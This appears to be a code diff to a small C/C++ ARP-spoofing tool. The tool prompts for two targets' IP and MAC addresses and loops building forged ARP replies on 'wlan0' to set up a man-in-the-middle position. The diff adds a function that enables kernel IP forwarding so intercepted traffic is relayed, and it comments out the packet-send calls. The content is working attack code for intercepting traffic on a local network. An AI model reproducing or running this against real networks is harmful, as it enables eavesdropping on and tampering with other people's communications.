@@ -3,7 +3,22 @@
 
 const char* dev = "wlan0";
 
-void mitm_attack(const char* ip1, const char* mac1, const char* ip2, const char* mac2);
+
+void ip_forward(bool b){
+	FILE *fp;
+	fp = fopen("/proc/sys/net/ipv4/ip_forward", "w");
+	if(fp == NULL){
+		perror("fopen");
+		return;
+	}
+
+	if(b)
+		fputc('1', fp);
+	else
+		fputc('0', fp);
+}
+void mitm_attack(const char* ip1, const char* mac1, 
+		const char* ip2, const char* mac2);
 
 
 
@@ -12,8 +27,8 @@ int main(int argc,char** argv){
 	char ip2[256];
 	char mac1[256];
 	char mac2[256];
-
-
+	
+	ip_forward(true);
 
 	printf("##TRAGET1##\n");
 	printf("ip address : ");
@@ -33,7 +48,8 @@ int main(int argc,char** argv){
 
 
 
-void mitm_attack(const char* ip1, const char* mac1, const char* ip2, const char* mac2){
+void mitm_attack(const char* ip1, const char* mac1, 
+		const char* ip2, const char* mac2){
 	pgen_arp pack_to_target1;
 	pgen_arp pack_to_target2;
 
@@ -54,19 +70,17 @@ void mitm_attack(const char* ip1, const char* mac1, const char* ip2, const char*
 	pack_to_target2.ARP.option = PGEN_ARPOP_REPLY;
 
 
-
-
 	for(int i=0; ; i++){
+		printf("\e[10d"); 
 		printf("0x%04x: %s[%s] <MITM Attack> %s[%s] \n", i, 
 				pack_to_target1.ARP.dstIp.c_str(),
 				pack_to_target1.ARP.dstEth.c_str(),
 				pack_to_target2.ARP.dstIp.c_str(),
 				pack_to_target2.ARP.dstEth.c_str() );
 
-		pack_to_target1.SEND(dev);
-		pack_to_target2.SEND(dev);
+		//pack_to_target1.SEND(dev);
+		//pack_to_target2.SEND(dev);
 		sleep(1);
-	}
-		
+	}		
 }
 
